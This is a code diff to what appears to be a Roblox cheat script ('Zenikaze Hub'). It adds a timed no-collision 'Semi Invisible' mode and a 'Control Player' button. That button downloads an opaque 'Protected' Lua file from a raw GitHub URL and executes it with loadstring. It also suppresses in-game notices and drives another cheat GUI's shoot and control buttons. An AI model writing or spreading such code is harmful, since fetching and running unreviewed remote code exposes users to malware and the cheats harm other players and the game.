@@ -66,6 +66,7 @@ local ScriptStatus = {
     JumpBoost          = SavedSettings.JumpBoost or false,
     BasesOpacity       = SavedSettings.BasesOpacity or false,
     ThirdFloor         = SavedSettings.ThirdFloor or false,
+    SemiInvisible      = SavedSettings.SemiInvisible or false,
 }
 local ActiveConnections  = {}
 local ESPObjects         = {}
@@ -370,8 +371,89 @@ LocalPlayer.CharacterAdded:Connect(function()
 end)
 
 -- ======================== --
---   3RD FLOOR SYSTEM       --
+--   SEMI INVISIBLE SYSTEM  --
 -- ======================== --
+local SemiInvisible = {}
+SemiInvisible.active = false
+SemiInvisible.animTrack = nil
+SemiInvisible.fallConn = nil
+
+function SemiInvisible:Start()
+    if SemiInvisible.active then return end
+    
+    local character = LocalPlayer.Character
+    if not character then return end
+    
+    SemiInvisible.active = true
+    ScriptStatus.SemiInvisible = true
+    SavedSettings.SemiInvisible = true
+    SaveSystem.Save(SavedSettings)
+    
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return end
+    
+    local anim = Instance.new("Animation")
+    anim.AnimationId = "rbxassetid://127212897044971"
+    
+    SemiInvisible.animTrack = humanoid.Animator:LoadAnimation(anim)
+    SemiInvisible.animTrack.Priority = Enum.AnimationPriority.Action4
+    SemiInvisible.animTrack:Play(0)
+    
+    -- Wait for animation to load
+    while SemiInvisible.animTrack.TimePosition < 0.1 do
+        task.wait()
+    end
+    
+    SemiInvisible.fallConn = RunService.Stepped:Connect(function()
+        if not SemiInvisible.active then return end
+        for _, basePart in pairs(character:GetDescendants()) do
+            if basePart:IsA("BasePart") and basePart.Name ~= "HumanoidRootPart" and basePart.CanCollide then
+                basePart.CanCollide = false
+                basePart:AddTag("WasCollidable")
+            end
+        end
+    end)
+    
+    -- Auto stop after 30 seconds
+    task.delay(30, function()
+        if SemiInvisible.active then
+            SemiInvisible:Stop()
+        end
+    end)
+end
+
+function SemiInvisible:Stop()
+    SemiInvisible.active = false
+    ScriptStatus.SemiInvisible = false
+    SavedSettings.SemiInvisible = false
+    SaveSystem.Save(SavedSettings)
+    
+    if SemiInvisible.fallConn then
+        SemiInvisible.fallConn:Disconnect()
+        SemiInvisible.fallConn = nil
+    end
+    
+    if SemiInvisible.animTrack then
+        SemiInvisible.animTrack:Stop()
+        SemiInvisible.animTrack = nil
+    end
+    
+    local character = LocalPlayer.Character
+    if character then
+        for _, basePart in ipairs(character:GetDescendants()) do
+            if basePart:IsA("BasePart") and basePart.Name ~= "HumanoidRootPart" and basePart:HasTag("WasCollidable") then
+                basePart.CanCollide = true
+                basePart:RemoveTag("WasCollidable")
+            end
+        end
+    end
+end
+
+LocalPlayer.CharacterAdded:Connect(function()
+    if SemiInvisible.active then
+        SemiInvisible:Stop()
+    end
+end)
 local ThirdFloor = {}
 ThirdFloor.platform = nil
 ThirdFloor.active = false
@@ -1437,10 +1519,12 @@ local SubPageFloat    = makePage()
 local SubPageFPS      = makePage()
 local SubPageThirdFloor = makePage()
 local SubPageJump     = makePage()
+local SubPageSemiInvis = makePage()
+local SubPageControlPlayer = makePage()
 
 local currentHome = "Stealer"
 local function showOnly(frame)
-    for _,f in ipairs({PageStealer,PageHelper,PageAutoJoiner,PageConfig,SubPageSpeed,SubPageFloat,SubPageFPS,SubPageThirdFloor,SubPageJump}) do f.Visible=(f==frame) end
+    for _,f in ipairs({PageStealer,PageHelper,PageAutoJoiner,PageConfig,SubPageSpeed,SubPageFloat,SubPageFPS,SubPageThirdFloor,SubPageJump,SubPageSemiInvis,SubPageControlPlayer}) do f.Visible=(f==frame) end
 end
 local function activateTab(btn, homeFrame)
     if _G.__ActiveTabButton and _G.__ActiveTabButton ~= btn then
@@ -1468,7 +1552,7 @@ local function createList(parent)
     end
 end
 createList(PageStealer); createList(PageHelper); createList(PageConfig)
-createList(SubPageSpeed); createList(SubPageFloat); createList(SubPageFPS); createList(SubPageThirdFloor); createList(SubPageJump)
+createList(SubPageSpeed); createList(SubPageFloat); createList(SubPageFPS); createList(SubPageThirdFloor); createList(SubPageJump); createList(SubPageSemiInvis); createList(SubPageControlPlayer)
 
 local function createButton(parent, text, callback)
     local b=Instance.new("TextButton")
@@ -1517,19 +1601,28 @@ local function createToggle(parent, label, initial, onChange)
 
     local b=Instance.new("TextButton", frame)
     b.Size=UDim2.new(0,56,0,22); b.Position=UDim2.new(1,-66,0.5,-11)
-    b.BackgroundColor3 = initial and Color3.fromRGB(100,255,100) or Color3.fromRGB(255,100,100)
-    b.BorderSizePixel=0; b.Text = initial and "ON" or "OFF"; b.TextColor3=Color3.fromRGB(0,0,0); b.TextSize=12; b.Font=Enum.Font.Gotham
+    b.BackgroundColor3 = initial and ZENIKAZE_COLOR or Color3.fromRGB(0,0,0)
+    b.BorderSizePixel=0; b.Text = initial and "ON" or "OFF"
+    b.TextColor3 = initial and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)
+    b.TextSize=12; b.Font=Enum.Font.Gotham
     Instance.new("UICorner", b).CornerRadius=UDim.new(0,8)
 
     local state = initial
     b.MouseButton1Click:Connect(function()
         state = not state
         local animInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
-        TweenService:Create(b, animInfo, {BackgroundColor3 = state and Color3.fromRGB(100,255,100) or Color3.fromRGB(255,100,100)}):Play()
+        local newBgColor = state and ZENIKAZE_COLOR or Color3.fromRGB(0,0,0)
+        local newTextColor = state and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)
+        TweenService:Create(b, animInfo, {BackgroundColor3 = newBgColor, TextColor3 = newTextColor}):Play()
         b.Text = state and "ON" or "OFF"
         if onChange then pcall(onChange, state) end
     end)
-    return { Set=function(v) state=v; b.BackgroundColor3 = v and Color3.fromRGB(100,255,100) or Color3.fromRGB(255,100,100); b.Text=v and "ON" or "OFF" end, Get=function() return state end }
+    return { Set=function(v) 
+        state=v
+        b.BackgroundColor3 = v and ZENIKAZE_COLOR or Color3.fromRGB(0,0,0)
+        b.TextColor3 = v and Color3.fromRGB(0,0,0) or Color3.fromRGB(255,255,255)
+        b.Text=v and "ON" or "OFF" 
+    end, Get=function() return state end }
 end
 
 -- ======================== --
@@ -1702,8 +1795,324 @@ local FPSBtn = createButton(SubPageFPS, "START!", function()
 end)
 
 -- ======================== --
---   3RD FLOOR (SUBPÁGINA)  --
+--   SEMI INVISIBLE (SUB)   --
 -- ======================== --
+do
+    local t = Instance.new("TextLabel", SubPageSemiInvis)
+    t.Size=UDim2.new(1,0,0,20); t.BackgroundTransparency=1; t.Text="SEMI INVISIBLE"
+    t.TextColor3=ZENIKAZE_COLOR; t.TextSize=16; t.Font=Enum.Font.Gotham
+end
+
+local SemiInvisToggle = createToggle(SubPageSemiInvis, "Semi Invisible", ScriptStatus.SemiInvisible, function(state)
+    if state then
+        SemiInvisible:Start()
+        showNotification("Semi Invisible", "Ativado por 30 segundos!", 3)
+    else
+        SemiInvisible:Stop()
+        showNotification("Semi Invisible", "Desativado!", 2)
+    end
+end)
+
+-- ======================== --
+--   CONTROL PLAYER (SUB)   --
+-- ======================== --
+do
+    local t = Instance.new("TextLabel", SubPageControlPlayer)
+    t.Size=UDim2.new(1,0,0,20); t.BackgroundTransparency=1; t.Text="CONTROL PLAYER"
+    t.TextColor3=ZENIKAZE_COLOR; t.TextSize=16; t.Font=Enum.Font.Gotham
+end
+
+local ControlPlayerBtn = createButton(SubPageControlPlayer, "Abrir Control Player", function()
+    task.spawn(function()
+        local url = "https://raw.githubusercontent.com/Obama9282921781/Rjdhdidjdj/refs/heads/main/Protected_4809522785054226.lua.txt"
+        pcall(function()
+            local src
+            local req = (syn and syn.request) or http_request or request
+            if req then
+                local r = req({Url = url, Method = "GET"})
+                src = r and (r.Body or r.body)
+            else
+                src = game:HttpGet(url)
+            end
+            local f = loadstring(src or "")
+            if f then f() end
+        end)
+    end)
+
+    task.spawn(function()
+        local Players          = game:GetService("Players")
+        local TweenService     = game:GetService("TweenService")
+        local UserInputService = game:GetService("UserInputService")
+        local LocalPlayer      = Players.LocalPlayer
+        local PlayerGui        = LocalPlayer:WaitForChild("PlayerGui")
+
+        local BAN = { "no nearby player", "no nearby player found", "no nearby", "no player", "no target" }
+        local function looksBanned(txt)
+            txt = string.lower(tostring(txt or ""))
+            for _,k in ipairs(BAN) do if string.find(txt, k, 1, true) then return true end end
+            return false
+        end
+        local function killToast(obj)
+            if obj and obj:IsA("TextLabel") and looksBanned(obj.Text) then
+                local container = obj
+                while container and container.Parent and not container:IsA("Frame") and not container:IsA("ScreenGui") do
+                    container = container.Parent
+                end
+                if container and container:IsA("Frame") then container:Destroy() else obj:Destroy() end
+            end
+        end
+        for _,d in ipairs(PlayerGui:GetDescendants()) do killToast(d) end
+        PlayerGui.DescendantAdded:Connect(killToast)
+
+        local function ensure(cls, name, parent)
+            if not parent then return nil end
+            local o = parent:FindFirstChild(name)
+            if not o then o = Instance.new(cls); o.Name = name; o.Parent = parent end
+            return o
+        end
+
+        local function waitForMainFrame(aj, timeoutSec)
+            local t0 = os.clock()
+            repeat
+                local main = aj:FindFirstChild("MainFrame")
+                    or aj:FindFirstChild("Frame")
+                    or aj:FindFirstChildOfClass("Frame")
+                    or aj:FindFirstChildWhichIsA("Frame", true)
+                if main then return main end
+                task.wait(0.05)
+            until os.clock() - t0 > (timeoutSec or 5)
+            return nil
+        end
+
+        local function makeDraggable(dragHandle, frame)
+            if not dragHandle or not frame then return end
+            local dragging, dragStart, startPos = false, nil, nil
+            local function updateDrag(input)
+                local delta = input.Position - dragStart
+                frame.Position = UDim2.new(
+                    startPos.X.Scale, startPos.X.Offset + delta.X,
+                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
+                )
+            end
+            dragHandle.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                    dragging  = true
+                    dragStart = input.Position
+                    startPos  = frame.Position
+                end
+            end)
+            dragHandle.InputEnded:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                    dragging = false
+                end
+            end)
+            UserInputService.InputChanged:Connect(function(input)
+                if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+                    updateDrag(input)
+                end
+            end)
+        end
+
+        local function applyZenikazeSkin(aj)
+            if not aj or aj:GetAttribute("ZenikazeSkinned") then return end
+            aj.ResetOnSpawn = false
+
+            local main = waitForMainFrame(aj, 5)
+            if not main then return end
+
+            main.BorderSizePixel   = 0
+            main.BackgroundColor3  = Color3.fromRGB(0, 0, 0)
+            main.Size              = UDim2.new(0, 280, 0, 170)
+            main.Position          = UDim2.new(0.5, -140, 0.5, -85)
+
+            local mainCorner = main:FindFirstChildOfClass("UICorner")
+            if not mainCorner then mainCorner = Instance.new("UICorner", main) end
+            mainCorner.CornerRadius = UDim.new(0, 16)
+
+            local mainStroke = main:FindFirstChildOfClass("UIStroke")
+            if not mainStroke then mainStroke = Instance.new("UIStroke", main) end
+            mainStroke.Color, mainStroke.Thickness, mainStroke.Transparency = Color3.fromRGB(255, 255, 0), 2, 0
+
+            local header = ensure("Frame", "Header", main)
+            header.Size = UDim2.new(1, 0, 0, 40)
+            header.Position = UDim2.new(0, 0, 0, 0)
+            header.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+            header.BorderSizePixel = 0
+
+            local headerCorner = header:FindFirstChildOfClass("UICorner")
+            if not headerCorner then headerCorner = Instance.new("UICorner", header) end
+            headerCorner.CornerRadius = UDim.new(0, 16)
+
+            local headerMask = ensure("Frame", "HeaderMask", header)
+            headerMask.Size = UDim2.new(1, 0, 0, 16)
+            headerMask.Position = UDim2.new(0, 0, 1, -16)
+            headerMask.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+            headerMask.BorderSizePixel = 0
+
+            local title = ensure("TextLabel", "TitleLabel", header)
+            title.BackgroundTransparency = 1
+            title.Size = UDim2.new(1, -50, 1, 0)
+            title.Position = UDim2.new(0, 16, 0, 0)
+            title.Font = Enum.Font.GothamBold
+            title.Text = "Zenikaze Hub ⚡"
+            title.TextColor3 = Color3.fromRGB(255, 255, 0)
+            title.TextSize = 20
+            title.TextXAlignment = Enum.TextXAlignment.Left
+
+            local close = ensure("TextButton", "CloseButton", header)
+            close.Size = UDim2.new(0, 32, 0, 32)
+            close.Position = UDim2.new(1, -36, 0, 4)
+            close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+            close.BorderSizePixel = 0
+            close.Text = "x"
+            close.TextColor3 = Color3.fromRGB(255, 255, 0)
+            close.TextSize = 14
+            close.Font = Enum.Font.GothamBold
+            if not close:FindFirstChildOfClass("UICorner") then
+                local c = Instance.new("UICorner", close)
+                c.CornerRadius = UDim.new(0, 8)
+            end
+            close.MouseEnter:Connect(function()
+                TweenService:Create(close, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 255, 0), TextColor3 = Color3.fromRGB(0, 0, 0)}):Play()
+            end)
+            close.MouseLeave:Connect(function()
+                TweenService:Create(close, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 0, 0), TextColor3 = Color3.fromRGB(255, 255, 0)}):Play()
+            end)
+            close.MouseButton1Click:Connect(function() aj.Enabled = false end)
+
+            local content = ensure("Frame", "Content", main)
+            content.Size = UDim2.new(1, -32, 1, -56)
+            content.Position = UDim2.new(0, 16, 0, 48)
+            content.BackgroundTransparency = 1
+
+            local layout = content:FindFirstChildOfClass("UIListLayout")
+            if not layout then
+                layout = Instance.new("UIListLayout", content)
+                layout.SortOrder = Enum.SortOrder.LayoutOrder
+                layout.Padding   = UDim.new(0, 8)
+            end
+
+            local btnControlOrig, btnShootOrig
+            local order = 1
+            local function styleButton(btn)
+                btn.Parent = content
+                btn.LayoutOrder = order
+                order = order + 1
+                btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+                btn.BorderSizePixel  = 0
+                btn.Size             = UDim2.new(1, 0, 0, 48)
+                btn.AutoButtonColor  = true
+                btn.Font             = Enum.Font.GothamBold
+                btn.TextSize         = 18
+                btn.TextColor3       = Color3.fromRGB(255, 255, 0)
+                if not btn:FindFirstChildOfClass("UICorner") then
+                    local uc = Instance.new("UICorner", btn)
+                    uc.CornerRadius = UDim.new(0, 12)
+                end
+                local s = btn:FindFirstChildOfClass("UIStroke") or Instance.new("UIStroke", btn)
+                s.Thickness, s.Color = 1, Color3.fromRGB(255, 255, 0)
+            end
+
+            for _, d in ipairs(main:GetDescendants()) do
+                if d:IsA("TextButton") and d.Name ~= "CloseButton" then
+                    local low = string.lower(d.Text or d.Name or "")
+                    if low:find("control") then
+                        btnControlOrig = btnControlOrig or d
+                    elseif low:find("shoot") or low:find("nearest") then
+                        btnShootOrig = btnShootOrig or d
+                    end
+                    styleButton(d)
+                end
+            end
+
+            local function clickBtn(btn)
+                if not btn then return end
+                local ok = false
+                if firesignal then ok = pcall(function() firesignal(btn.MouseButton1Click) end) end
+                if not ok then pcall(function() btn:Activate() end) end
+            end
+
+            if not content:FindFirstChild("MainButton") then
+                local mainButton = Instance.new("TextButton")
+                mainButton.Name = "MainButton"
+                mainButton.Text = "Control Player"
+                mainButton.Parent = content
+                mainButton.LayoutOrder = 1
+                mainButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+                mainButton.BorderSizePixel  = 0
+                mainButton.Size             = UDim2.new(1, 0, 0, 48)
+                mainButton.AutoButtonColor  = true
+                mainButton.Font             = Enum.Font.GothamBold
+                mainButton.TextSize         = 18
+                mainButton.TextColor3       = Color3.fromRGB(255, 255, 0)
+                local uc = Instance.new("UICorner", mainButton); uc.CornerRadius = UDim.new(0, 12)
+                local st = Instance.new("UIStroke", mainButton); st.Thickness = 1; st.Color = Color3.fromRGB(255, 255, 0)
+
+                local function park(btn)
+                    if not btn then return end
+                    btn.Visible = false
+                    btn.Position = UDim2.new(2, 0, 2, 0)
+                    btn.ZIndex = -1
+                    btn.AutoButtonColor = false
+                end
+                park(btnShootOrig)
+                park(btnControlOrig)
+
+                mainButton.MouseButton1Click:Connect(function()
+                    clickBtn(btnShootOrig)
+                    task.delay(2, function()
+                        clickBtn(btnControlOrig)
+                    end)
+                end)
+            end
+
+            local nameLbl = content:FindFirstChild("NameLabel")
+            if not nameLbl then
+                nameLbl = Instance.new("TextLabel")
+                nameLbl.Name = "NameLabel"
+                nameLbl.LayoutOrder = 99
+                nameLbl.Size = UDim2.new(1, 0, 0, 36)
+                nameLbl.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+                nameLbl.BorderSizePixel = 0
+                nameLbl.Text = "Seu nome"
+                nameLbl.TextColor3 = Color3.fromRGB(255, 255, 0)
+                nameLbl.TextSize = 18
+                nameLbl.Font = Enum.Font.Gotham
+                nameLbl.Parent = content
+                local uc2 = Instance.new("UICorner", nameLbl); uc2.CornerRadius = UDim.new(0, 10)
+                local s2 = Instance.new("UIStroke", nameLbl);  s2.Thickness = 1; s2.Color = Color3.fromRGB(255, 255, 0)
+            end
+
+            makeDraggable(header, main)
+            aj:SetAttribute("ZenikazeSkinned", true)
+        end
+
+        local function trySkin()
+            local aj = PlayerGui:FindFirstChild("AjjanGui") or PlayerGui:FindFirstChild("Ajjan's GUI")
+            if aj then applyZenikazeSkin(aj) end
+        end
+        trySkin()
+        PlayerGui.ChildAdded:Connect(function(c)
+            if c.Name == "AjjanGui" or c.Name == "Ajjan's GUI" then
+                applyZenikazeSkin(c)
+            end
+        end)
+
+        while task.wait(0.02) do
+            local aj = PlayerGui:FindFirstChild("AjjanGui") or PlayerGui:FindFirstChild("Ajjan's GUI")
+            if aj and aj:GetAttribute("ZenikazeSkinned") then
+                local main = aj:FindFirstChild("MainFrame") or aj:FindFirstChild("Frame") or aj:FindFirstChildOfClass("Frame")
+                local content = main and main:FindFirstChild("Content")
+                local lbl = content and content:FindFirstChild("NameLabel")
+                if lbl and lbl:IsA("TextLabel") then
+                    lbl.Text = "ZenithExility"
+                end
+            end
+        end
+    end)
+    
+    showNotification("Control Player", "Interface carregada com tema Zenikaze!", 3)
+end)
 do
     local t = Instance.new("TextLabel", SubPageThirdFloor)
     t.Size=UDim2.new(1,0,0,20); t.BackgroundTransparency=1; t.Text="3RD FLOOR"
@@ -1856,6 +2265,20 @@ createButton(PageStealer, "FPS Destroyer", function()
 end)
 createButton(PageStealer, "3rd Floor", function()
     BackButton.Visible=true; showOnly(SubPageThirdFloor)
+end)
+
+createToggle(PageStealer, "Semi Invisible", ScriptStatus.SemiInvisible, function(state)
+    if state then
+        SemiInvisible:Start()
+        showNotification("Semi Invisible", "Ativado por 30 segundos!", 3)
+    else
+        SemiInvisible:Stop()
+        showNotification("Semi Invisible", "Desativado!", 2)
+    end
+end)
+
+createButton(PageStealer, "Control Player", function()
+    BackButton.Visible=true; showOnly(SubPageControlPlayer)
 end)
 
 -- ======================== --
